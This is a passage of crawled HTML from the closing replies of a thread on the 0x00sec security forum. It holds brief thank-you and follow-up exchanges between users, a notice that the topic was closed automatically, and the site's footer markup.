<meta itemprop="dateModified" content="2019-03-09T23:49:17Z">
<span itemprop="position">6</span>
</span>
</div>
<div class="post" itemprop="text">
<p>well, i‚Äôm a beginner. so thanks again</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_7" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/tr4cefl0w"><span itemprop="name">tr4cefl0w</span></a>
</span>
<link itemprop="mainEntityOfPage" href="12099.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-03-10T00:49:00Z" class="post-time">
March 10, 2019, 12:49am
</time>
<meta itemprop="dateModified" content="2019-03-10T00:49:00Z">
<span itemprop="position">7</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Feel free to message me directly if you ever have any questions.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_10" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/xmrchaos"><span itemprop="name">xmrchaos</span></a>
(Nacereddine GACEB)
</span>
<link itemprop="mainEntityOfPage" href="12099.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-04-01T22:18:29Z" class="post-time">
April 1, 2019, 10:18pm
</time>
<meta itemprop="dateModified" content="2019-04-01T22:18:29Z">
<span itemprop="position">10</span>
</span>
</div>
<div class="post" itemprop="text">
<p>where is the first and second topic?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_11" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/tr4cefl0w"><span itemprop="name">tr4cefl0w</span></a>
</span>
<link itemprop="mainEntityOfPage" href="12099.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-04-02T19:03:35Z" class="post-time">
April 2, 2019, 7:03pm
</time>
<meta itemprop="dateModified" content="2019-04-02T19:03:35Z">
<span itemprop="position">11</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Have you ever heard of Google? Or thought of clicking on my profile? <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_12" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/system"><span itemprop="name">system</span></a>
(system)
Closed
</span>
<link itemprop="mainEntityOfPage" href="12099.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-04-07T01:53:55Z" class="post-time">
April 7, 2019, 1:53am
</time>
<meta itemprop="dateModified" content="2019-04-07T01:53:55Z">
<span itemprop="position">12</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
